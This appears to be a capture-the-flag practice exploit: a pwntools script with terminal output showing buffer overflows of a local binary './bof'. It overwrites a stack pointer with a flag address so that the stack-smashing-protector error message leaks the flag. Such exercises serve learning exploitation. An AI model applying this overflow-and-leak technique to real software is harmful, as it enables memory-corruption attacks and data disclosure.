'''
root@kali:~/Desktop/D/work/github/Practices/pwn/ssp_leak# python -c "print 'A'*163" | ./bof
*** stack smashing detected ***: ./bof terminated
Segmentation fault
root@kali:~/Desktop/D/work/github/Practices/pwn/ssp_leak# python -c "print 'A'*164" | ./bof
*** stack smashing detected ***:  terminated
Segmentation fault
root@kali:~/Desktop/D/work/github/Practices/pwn/ssp_leak# python -c "print 'A'*164+'\x00\x00\x00\x00'" | ./bof
*** stack smashing detected ***: <unknown> terminated
Segmentation fault
'''

from pwn import *

io = process('./bof')

context.log_level='debug'

flag_addr = 0x08049718
io.send('A'*164 + p32(flag_addr))
io.recv()